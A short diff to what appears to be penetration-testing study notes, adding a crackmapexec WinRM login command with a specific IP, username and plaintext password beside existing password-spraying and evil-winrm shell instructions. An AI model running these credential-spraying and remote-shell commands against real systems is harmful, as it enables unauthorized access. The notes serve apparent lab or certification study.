@@ -360,6 +360,9 @@ a. Network Exploitation
 		Password Spraying: Password spraying involves attempting a single password against multiple user accounts, avoiding account lockouts due to multiple failed authentication attempts:
 		crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2023!' --continue-on-success
 
+		check also this:
+		crackmapexec winrm 192.168.235.165 -u enox -p california
+
 
 		e.) evil-winrm
 		 If you got a username/password with hash and you want to get a shell from it, like a CMD/Powershell... you can use evil-winrm
